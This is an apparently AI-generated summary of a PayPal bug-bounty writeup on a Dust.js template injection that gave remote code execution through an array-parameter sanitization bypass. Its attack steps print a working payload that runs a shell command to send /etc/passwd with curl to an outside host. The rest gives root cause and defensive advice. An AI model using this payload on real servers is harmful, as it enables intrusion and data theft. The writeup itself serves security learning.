# PayPal Node.js Dust.js Template Injection RCE

## Metadata
- **Source:** writeups.io
- **Date:** 2026-06-17
- **Author:** Various
- **Program:** PayPal
- **Bounty:** $10,000
- **Severity:** CRITICAL
- **Vuln types:** Server-Side Template Injection (SSTI), Code Injection, Remote Code Execution (RCE), Improper Input Validation
- **Category:** memory-binary
- **Writeup:** http://artsploit.blogspot.com/2016/08/pprce2.html

## Summary
A critical code injection vulnerability was discovered in PayPal's demo.paypal.com where user-supplied input was passed directly to Dust.js template engine's eval-based 'if' helper function. By exploiting improper type handling where array parameters bypass string sanitization, an attacker could execute arbitrary JavaScript and system commands with server privileges.

## Attack scenario (step by step)
1. Attacker performs HTTP parameter fuzzing and notices the application responds with Dust.js-related syntax errors for backslash and newline characters
2. Through error analysis, attacker identifies the 'if' Dust.js helper uses eval() for expression evaluation
3. Attacker discovers that standard quote/double-quote filtering exists but crafts a payload using array parameter syntax (device[])
4. When parsed as arrays instead of strings, the qs module bypasses the string sanitization routine that encodes quotes
5. Attacker sends: ?device[]=x&device[]=y'-require('child_process').exec('curl -F "x=$(cat /etc/passwd)" artsploit.com')-'
6. The injected JavaScript executes within eval() context, allowing system command execution to exfiltrate sensitive files

## Root cause
Multiple layers of inadequate security: (1) use of eval() for template expression evaluation, (2) type-dependent input sanitization that only handles strings, (3) lack of proper input validation before template processing, (4) insufficient testing of parameter type variations (array vs string)

## Attacker mindset
Methodical fuzzer who performs comprehensive parameter testing including type variations. Recognizes that sanitization routines often have type-dependent vulnerabilities and exploits the difference between how arrays and strings are processed. Understands template engine internals and JavaScript runtime behavior to craft working payloads.

## Defensive takeaways
- Never use eval() or equivalent dynamic code execution on user-controlled data
- Implement input validation that is type-agnostic (validate all representations of a parameter, not just strings)
- Replace Dust.js 'if' helpers with safe expression evaluators that don't use eval
- Apply defense-in-depth: sanitize at multiple layers and use CSP/sandboxing
- Fuzz with parameter type variations (string, array, object, null) during security testing
- Use allowlist-based expression parsing instead of unsafe eval
- Keep dependencies updated and monitor for known template engine vulnerabilities

## Variant hunting
Search for similar patterns: (1) other template engines using eval (ERB, Jinja2 with dangerous filters), (2) applications using qs or similar parsers that handle type coercion differently, (3) parameters with array syntax in other PayPal endpoints, (4) any server-side templating with 'if'/'conditional' helpers, (5) applications where sanitization logic checks typeof === 'string'

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1027 - Obfuscation of Files or Information
- T1083 - File and Directory Discovery

## Notes
This vulnerability exemplifies how security defenses can be bypassed through understanding implementation details. The attacker's insight that type-dependent sanitization creates a gap was crucial. The use of array notation to circumvent string-based escaping demonstrates the importance of parameter handling edge cases. Dust.js team later deprecated the dangerous 'if' helper in favor of safer alternatives. This was a well-deserved $10,000 bounty for identifying a critical RCE in a major financial institution's public demo server.

---
*Analysed by Claude (claude-haiku-4-5-20251001) on 2026-06-17*
